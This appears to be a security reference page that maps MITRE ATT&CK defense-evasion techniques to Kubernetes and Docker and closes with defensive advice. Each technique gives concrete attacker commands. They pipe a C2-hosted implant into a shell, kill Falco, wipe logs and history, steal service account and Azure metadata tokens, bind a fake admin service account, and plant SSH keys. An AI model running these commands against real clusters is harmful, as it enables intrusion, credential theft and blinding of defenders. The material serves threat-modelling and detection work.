# Defense Evasion

## 🛡️ **Defense Evasion Techniques in Containerized Environments**

In Kubernetes, Docker, and cloud-native infrastructures, adversaries use Defense Evasion techniques to avoid detection, bypass security controls, and blend into legitimate activity.\
This often involves building or deploying stealthy containers, hijacking authentication material, disabling defenses, or masquerading as trusted components.

***

### Deploy a Container T1610

**Description**:\
Deploy malicious containers disguised as benign utilities or system pods to blend into cluster workloads.

**Container Example**:

* Deploy a seemingly harmless pod:

```bash
kubectl run benign --image=alpine -- sh -c "curl http://c2/implant.sh | sh"
```

* Hide malware inside initContainers or short-lived Jobs.

**Result**:\
Malicious containers appear as normal, trusted workloads — evading manual reviews and simple monitoring.

#### Build Image on Host **T1610.001**

**Description**:\
Build malicious container images locally on compromised hosts or pods to evade static scanning, registry policies, or signature validation.

**Container Example**:

* Build and tag a stealthy image without touching external registries:

```bash
docker build -t stealth-backdoor .
docker tag stealth-backdoor localhost:5000/nginx
```

* Push to a private internal registry or load it directly onto nodes.

**Result**:\
Avoids inspection by CI/CD security tools (e.g., Trivy, Clair, Notary) since the image never enters scanned environments.

***

### **Impair Defenses T1562**

Impair Defenses refers to adversaries modifying, disabling, or bypassing security mechanisms to weaken detection and response capabilities.

In containerized environments like Kubernetes and Docker, this often involves:

* Killing runtime security tools (e.g., Falco, AppArmor, seccomp profiles)
* Disabling audit logging
* Tampering with agents like Fluentd, Prometheus, or EDR
* Altering Kubernetes or Docker daemon settings

Adversaries impair defenses early post-compromise to stay hidden, persist longer, and move more freely across the environment without detection.

**Disable or Modify Tools T1562.001**&#x20;

**Description**:\
Disable or tamper with container runtime defenses like Falco, audit logging, seccomp, or AppArmor to blind detection.

**Container Example**:

* Kill Falco or tamper with its config:

```bash
pkill falco
rm /etc/falco/falco.yaml
```

* Disable Kubernetes audit logs by modifying `kube-apiserver` flags:

```
--audit-log-path=""
```

**Result**:\
Container runtime or cluster-level defenses are weakened or entirely disabled.

***

### Indicator Removal **T1070**

**Description**:\
Delete logs, shell history, or other forensic artifacts inside containers or hosts to cover attacker tracks.

**Container Example**:

* Clean logs and history from inside a compromised pod:

```bash
bashCopyEdithistory -c
rm -rf /var/log/*
echo "" > ~/.bash_history
```

* Use ephemeral containers that auto-delete after execution to leave minimal evidence.

**Result**:\
Reduces evidence available for incident response and slows detection.

***

#### Masquerading T**1036**

Masquerading refers to adversaries disguising malicious artifacts as legitimate ones to avoid detection.\
Rather than hiding completely, attackers blend in with expected system behavior by using familiar names, paths, binaries, accounts, or metadata.

In containerized environments like Kubernetes and Docker, Masquerading often targets:

* Pod names, image names, or deployment labels
* Service accounts named after real monitoring tools
* Binary names (e.g., sshd, kubelet) to mimic system processes
* Filesystem paths that match legitimate directories

The goal is to make malicious activity look normal — either visually to admins or programmatically to security tools.

#### Match Legitimate Name or Location **T1036.005**

**Description**:\
Name containers, images, or binaries to imitate legitimate components.

**Container Example**:

* Deploy a malicious pod named after common system services:

```bash
kubectl run metrics-server --image=evilcorp/backdoor:latest
```

* Drop binaries named `sshd`, `kubelet`, or `update.sh` into known system paths like `/usr/bin/`.

**Result**:\
Malicious processes or containers are overlooked during casual inspections.

***

### Masquerade Account Name **T1036.003**

**Description**:\
Create service accounts or usernames that resemble legitimate monitoring or admin accounts.

**Container Example**:

* Create a service account named **grafana-agent**:

```bash
kubectl create serviceaccount grafana-agent
kubectl create clusterrolebinding grafana-agent --clusterrole=admin --serviceaccount=default:grafana-agent
```

**Result**:\
Attacker-controlled accounts look like regular system or monitoring accounts, reducing suspicion.

***

#### Use Alternate Authentication Material&#x20;

Use Alternate Authentication Material refers to adversaries using tokens, keys, cookies, or other non-password-based secrets to gain unauthorized access.\
Instead of stealing passwords, attackers abuse authentication artifacts that grant access directly, often bypassing traditional login flows, multi-factor authentication (MFA), or security monitoring.

In containerized and cloud-native environments, this often means:

* Stealing Kubernetes service account tokens
* Harvesting cloud instance metadata tokens (GCP, AWS, Azure)
* Grabbing OAuth access tokens, JWTs, or session cookies
* Replaying these tokens against APIs, consoles, or services

Alternate authentication material is often highly privileged and rarely protected as strongly as credentials — making it an attractive target.

#### Application Access Token **T1550.001**&#x20;

**Description**:\
Steal and reuse Kubernetes service account tokens, cloud IAM tokens, or OAuth tokens to authenticate invisibly.

**Container Example**:

* Dump Kubernetes token inside a pod:

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

* Query Kubernetes API externally:

```bash
curl -k -H "Authorization: Bearer $TOKEN" https://<api-server>/api/v1/nodes
```

* Steal tokens from cloud metadata services:

```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Result**:\
Silent, unauthorized access across services without needing to crack passwords.

***

### Valid Accounts T1078

Valid Accounts refers to adversaries leveraging existing, legitimate credentials to gain access to systems or environments.

In containerized environments, this often means attackers abuse Kubernetes service accounts, default or exposed credentials, or previously stolen cloud IAM identities to authenticate and operate without raising immediate suspicion.

By using valid accounts, adversaries bypass traditional security controls (like firewall rules or authentication systems) because they appear to be authorized users or services.

#### Default Accounts T**1078.001**&#x20;

**Description**:\
Abuse default credentials or default Kubernetes service accounts that were never properly hardened.

**Container Example**:

* Exploit the default service account in the `default` namespace:

```bash
kubectl auth can-i --as=system:serviceaccount:default:default '*' '*'
```

* Log into dashboards like ArgoCD or Jenkins with default credentials:

```
Username: admin
Password: admin
```

**Result**:\
Persistence and privilege escalation without needing to exploit vulnerabilities.

#### Local Accounts **T1078.003**

**Description**:\
Use existing or attacker-created Linux accounts on container hosts to maintain hidden access.

**Container Example**:

* SSH into a Kubernetes node with leaked credentials:

```bash
ssh ubuntu@k8s-node
```

* Drop an SSH key persistently:

```bash
echo "ssh-rsa AAAAB3..." >> /mnt/root/.ssh/authorized_keys
```

✅ **Result**:\
Persistent backdoor at the host level, independent of containerized workloads.

***

## **Defense Evasion Techniques in Containerized Environments Summary**

| Technique/Subtechnique            | MITRE ID  | Container Example                                |
| --------------------------------- | --------- | ------------------------------------------------ |
| Build Image on Host               | T1610.001 | Build and tag malicious images locally           |
| Deploy Container                  | T1610     | Deploy stealth containers (e.g., alpine+payload) |
| Disable or Modify Tools           | T1562.001 | Kill Falco, disable audit logging                |
| Indicator Removal                 | T1070     | Clear logs, shell history                        |
| Match Legitimate Name or Location | T1036.005 | Name pods or binaries after trusted components   |
| Masquerade Account Name           | T1036.003 | Create fake system service accounts              |
| Application Access Token          | T1550.001 | Steal and reuse Kubernetes/cloud tokens          |
| Default Accounts                  | T1078.001 | Abuse default service accounts or credentials    |
| Local Accounts                    | T1078.003 | SSH backdoors into Kubernetes nodes              |

***

## 🎯 Final Summary

Defending against Defense Evasion in container environments focuses on:

* **Hardening Kubernetes service accounts, audit logging, and image pipelines**
* **Restricting metadata service access and hostPath mounts**
* **Monitoring unusual container deployments, token usage, and account creation**
* **Enforcing naming conventions and signing policies**
